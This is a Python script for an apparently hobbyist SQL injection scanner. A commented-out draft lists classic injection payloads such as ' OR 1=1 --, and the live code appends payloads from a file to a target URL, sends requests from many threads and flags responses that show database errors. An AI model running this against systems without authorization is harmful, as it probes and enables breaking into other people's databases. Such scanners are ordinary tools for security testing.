# # # yhe shi hai 
# import requests

# # Some basic SQL injection test payloads
# payloads = [
#     "'",
#     "' OR '1'='1",
#     "' OR 1=1 --"
# ]




# # This function tests each payload on the given URL
# def test_sql_injection(base_url):
#     print("\n--- Starting Scan ---\n")

#     for payload in payloads:
#         # Add payload to the base URL
#         test_url = base_url + payload

#         try:
#             # Send GET request
#             response = requests.get(test_url)

#             # Convert response content to lowercase for easy searching
#             content = response.text.lower()

#             # Check for common SQL error words in response
#             if "sql" in content or "error" in content or "syntax" in content:
#                 print(f"[VULNERABLE] => {test_url}")
#             else:
#                 print(f"[SAFE] => {test_url}")

#         except:
#             print(f"[ERROR] Could not reach: {test_url}")

# # # Ask user for target URL
# # user_url = input("Enter URL with parameter (e.g., http://testphp.vulnweb.com/listproducts.php?cat=): ")

# # # Run the scanner
# # test_sql_injection(user_url)

# import sys
# if len(sys.argv) > 1:
#     test_sql_injection(sys.argv[1])
# else:
#     print("No URL provided")



import requests
import sys
import time
import os
import threading
from queue import Queue

# Load payloads
def load_payloads(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[ERROR] File '{file_path}' not found.")
        return []

# Categorize payload
def categorize_payload(payload):
    p = payload.lower()
    if "or 1=1" in p or "--" in p or "' or" in p:
        return "Most Critical"
    elif "union" in p or "select" in p:
        return "Moderate"
    else:
        return "Least Critical"

# Queues + threading for speed
results = {
    "Most Critical": [],
    "Moderate": [],
    "Least Critical": []
}
lock = threading.Lock()

def worker(base_url, q):
    while not q.empty():
        payload = q.get()
        test_url = base_url + payload
        try:
            res = requests.get(test_url, timeout=5)
            content = res.text.lower()
            if any(w in content for w in ["sql", "error", "syntax", "mysql", "warning"]):
                category = categorize_payload(payload)
                with lock:
                    results[category].append((payload, test_url))
                print(f"[VULNERABLE] ({category})\nPayload: {payload}\nURL: {test_url}\n")
            else:
                print(f"[SAFE]\nPayload: {payload}\nURL: {test_url}\n")
        except Exception as e:
            print(f"[ERROR]\nPayload: {payload}\nURL: {test_url}\nReason: {str(e)}\n")
        q.task_done()

def test_sql_injection(base_url, payloads):
    print("--- Starting Fast SQL Injection Scan ---\n")
    q = Queue()
    for p in payloads:
        q.put(p)

    thread_count = min(20, len(payloads))  # Run up to 20 threads
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=worker, args=(base_url, q))
        t.daemon = True
        t.start()
        threads.append(t)

    q.join()

    print("--- Categorized Vulnerable Payloads ---\n")
    for category in results:
        print(f"{category} Payloads:")
        if results[category]:
            for payload, url in results[category]:
                print(f"  - Payload: {payload}")
                print(f"    URL: {url}")
        else:
            print("  None found.")
        print()

# Run from CLI
if len(sys.argv) > 1:
    base_url = sys.argv[1]
    payload_file = os.path.join(os.path.dirname(__file__), "sql_payloads.txt")
    payloads = load_payloads(payload_file)
    if payloads:
        test_sql_injection(base_url, payloads)
else:
    print("No URL provided via command-line.")
